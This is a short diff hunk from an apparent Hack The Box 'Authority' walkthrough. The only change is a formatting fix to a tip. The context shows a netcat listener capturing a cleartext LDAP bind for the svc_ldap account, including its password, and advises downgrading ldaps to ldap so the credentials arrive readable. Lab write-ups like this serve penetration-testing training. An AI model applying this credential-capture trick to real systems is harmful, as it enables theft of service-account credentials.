@@ -409,7 +409,7 @@ Ncat: Connection from 10.10.11.222.
 Ncat: Connection from 10.10.11.222:56536.
 0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!0P
 ```
->info When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request we recieve will be encrypted and can break your terminal session.
+> When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request we recieve will be encrypted and can break your terminal session.
 
 ```console
 0ph3@parrot~$ nc -nvlp 636
